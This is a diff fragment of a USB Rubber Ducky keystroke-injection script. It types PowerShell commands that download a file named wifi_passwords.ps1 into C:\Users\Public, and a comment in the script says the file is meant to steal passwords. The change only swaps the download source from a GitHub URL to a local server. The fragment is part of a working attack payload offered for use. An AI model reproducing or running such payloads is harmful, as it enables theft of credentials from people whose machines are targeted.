@@ -14,7 +14,7 @@ DELAY 750
 REM Download ps1 file to steal the passwords
 STRING $client = new-object System.Net.WebClient
 ENTER
-STRING $client.DownloadFile("https://raw.githubusercontent.com/FlaviusMosneagu/wifi_passwords/main/wifi_passwords.ps1", "C:\Users\Public\wifi_passwords.ps1");
+STRING $client.DownloadFile("http://127.0.0.1:8000/static/wifi_passwords.ps1", "C:\Users\Public\wifi_passwords.ps1");
 ENTER
 
 STRING cd C:\Users\Public\
